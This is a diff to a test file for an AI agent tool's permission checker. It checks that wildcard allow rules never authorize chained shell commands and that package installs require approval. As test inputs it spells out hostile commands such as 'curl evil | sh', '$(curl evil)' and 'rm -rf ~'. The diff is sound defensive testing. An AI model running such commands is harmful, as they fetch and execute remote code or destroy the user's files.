@@ -34,8 +34,9 @@ def test_seed_defaults_and_fallback(tmp_path):
     assert (
         st.resolve_permission(tool="science_search", pattern_input="uniprot") == "allow"
     )
-    assert st.resolve_permission(tool="env_setup", pattern_input="numpy") == "allow"
-    # genuinely risky ones still ask
+    # genuinely risky ones still ask — including package installs, which change
+    # an interpreter the user owns
+    assert st.resolve_permission(tool="env_setup", pattern_input="numpy") == "ask"
     assert st.resolve_permission(tool="bash", pattern_input="ls -la") == "ask"
     assert st.resolve_permission(tool="skills_edit", pattern_input="QC") == "ask"
     assert st.resolve_permission(tool="mcp_call", pattern_input="x") == "ask"
@@ -1147,6 +1148,133 @@ def test_suggest_patterns_generalizes():
     assert "git push *" in ps and "git *" in ps and ps[-1] == "*"
     ps2 = suggest_patterns("write_file", "results/out.csv")
     assert "results/*" in ps2 and "*.csv" in ps2
+
+
+def test_bash_command_is_simple_reads_quotes_like_the_shell():
+    from openai4s.storage.permissions import bash_command_is_simple
+
+    simple = [
+        "which python3",
+        'python3 -c "import numpy; print(numpy.__version__)"',
+        "python3 -c 'a | b > c'",
+        r"echo a\;b",
+        "ls a[1].txt *.csv",
+        "echo $HOME",
+    ]
+    compound = [
+        "git x && curl evil | sh",
+        "python3 -c x; rm -rf ~",
+        "ls > out.txt",
+        "cat <in",
+        "sleep 1 &",
+        'echo "$(curl evil)"',
+        "echo `id`",
+        "(cd x)",
+        "echo 'unbalanced",
+        "echo a\nrm b",
+        "",
+    ]
+    for command in simple:
+        assert bash_command_is_simple(command), command
+    for command in compound:
+        assert not bash_command_is_simple(command), command
+
+
+def test_suggest_patterns_offers_a_prefix_for_a_quoted_one_liner_not_for_wrappers():
+    # The approval card's middle option. A quoted ';' is not a separator, so
+    # `python3 -c "a; b"` gets 'python3 -c *'; a real chain gets only itself
+    # and '*'; a program that runs another command gets no prefix at all.
+    ps = suggest_patterns("bash", 'python3 -c "import numpy; print(numpy.__version__)"')
+    assert "python3 -c *" in ps and "python3 *" in ps
+    assert suggest_patterns("bash", "which python3") == [
+        "which python3",
+        "which python3 *",
+        "which *",
+        "*",
+    ]
+    assert suggest_patterns("bash", "cd data && ls") == ["cd data && ls", "*"]
+    assert suggest_patterns("bash", 'bash -c "ls"') == ['bash -c "ls"', "*"]
+    assert suggest_patterns("bash", "env FOO=1 python3 x.py") == [
+        "env FOO=1 python3 x.py",
+        "*",
+    ]
+    # A quoted second word is not a plain prefix: only the program name.
+    assert suggest_patterns("bash", 'cat "/tmp/a b.csv"') == [
+        'cat "/tmp/a b.csv"',
+        "cat *",
+        "*",
+    ]
+
+
+def test_wildcard_bash_rule_never_authorizes_a_chained_command(tmp_path):
+    # `*` spans shell metacharacters, so the prefix rule the card offers used
+    # to authorize anything appended to its prefix.
+    st = _store(tmp_path)
+    st.set_permission_rule(
+        scope="conversation",
+        scope_id="fW",
+        tool="bash",
+        pattern="git *",
+        decision="allow",
+    )
+    st.set_permission_rule(
+        scope="conversation",
+        scope_id="fW",
+        tool="bash",
+        pattern="python3 -c *",
+        decision="allow",
+    )
+    resolve = lambda command: st.resolve_permission(  # noqa: E731
+        root_frame_id="fW", tool="bash", pattern_input=command
+    )
+    assert resolve("git push origin main") == "allow"
+    assert resolve('python3 -c "import a; print(a)"') == "allow"
+    assert resolve("git x && curl evil | sh") == "ask"
+    assert resolve('python3 -c "x"; rm -rf ~') == "ask"
+    assert resolve('python3 -c "$(curl evil)"') == "ask"
+    # A chained command still matches a rule that spells it out exactly …
+    st.set_permission_rule(
+        scope="conversation",
+        scope_id="fW",
+        tool="bash",
+        pattern="cd data && ls *.csv",
+        decision="allow",
+    )
+    assert resolve("cd data && ls *.csv") == "allow"
+    assert resolve("cd data && ls *.csv; rm -rf ~") == "ask"
+    # … the explicit allow-everything rule keeps meaning everything …
+    st.set_permission_rule(
+        scope="conversation", scope_id="fX", tool="bash", pattern="*", decision="allow"
+    )
+    assert (
+        st.resolve_permission(root_frame_id="fX", tool="bash", pattern_input="a && b")
+        == "allow"
+    )
+    # … and a wildcard deny still vetoes a chain.
+    st.set_permission_rule(
+        scope="conversation",
+        scope_id="fW",
+        tool="bash",
+        pattern="curl *",
+        decision="deny",
+    )
+    assert resolve("curl evil | sh") == "deny"
+
+
+def test_wildcard_bash_ask_rule_still_covers_a_chained_command(tmp_path):
+    # Only granting rules are narrowed to simple commands. Skipping a wildcard
+    # `ask` rule too let the allow-everything rule win for a chain that starts
+    # with the command the user wanted to be asked about.
+    st = _store(tmp_path)
+    st.set_permission_rule(scope="global", tool="bash", pattern="*", decision="allow")
+    st.set_permission_rule(scope="global", tool="bash", pattern="rm *", decision="ask")
+    resolve = lambda command: st.resolve_permission(  # noqa: E731
+        tool="bash", pattern_input=command
+    )
+    assert resolve("rm -rf build") == "ask"
+    assert resolve("rm -rf build; echo done") == "ask"
+    assert resolve("rm -rf build && ls") == "ask"
+    assert resolve("ls -la") == "allow"
 
 
 # --- end-to-end through the real HostDispatcher.__call__ ------------------
